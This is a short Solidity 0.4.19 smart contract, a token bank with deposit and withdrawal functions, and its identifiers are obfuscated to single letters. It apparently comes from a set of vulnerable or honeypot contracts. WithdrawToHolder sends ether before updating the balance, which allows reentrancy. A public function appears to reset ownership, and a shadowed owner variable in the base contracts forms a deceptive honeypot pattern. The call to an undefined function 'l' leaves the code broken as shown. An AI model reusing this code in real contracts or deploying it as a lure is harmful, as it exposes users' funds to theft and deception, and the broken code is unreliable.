pragma solidity ^0.4.19;

contract Ownable
{
    address e;
    address j = msg.sender;

    function c(address m)
    public
    d
    {
        e = m;
    }

    function b()
    public
    {
        if(msg.sender==e)
        {
            j=e;
        }
    }

    modifier d
    {
        if(j == msg.sender)_;
    }
}

contract Token is Ownable
{
    address j = msg.sender;
    function WithdrawToken(address i, uint256 g,address p)
    public
    d
    {
        i.call(bytes4(l("transfer(address,uint256)")),p,g);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;


    function a()
    public
    {
        j = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address o,address h,uint f)
    public
    d
    {
        if(Holders[o]>0)
        {
            Holders[o]=0;
            WithdrawToken(h,f,o);
        }
    }

    function WithdrawToHolder(address k, uint n)
    public
    d
    payable
    {
        if(Holders[k]>0)
        {
            if(k.call.value(n)())
            {
                Holders[k]-=n;
            }
        }
    }
}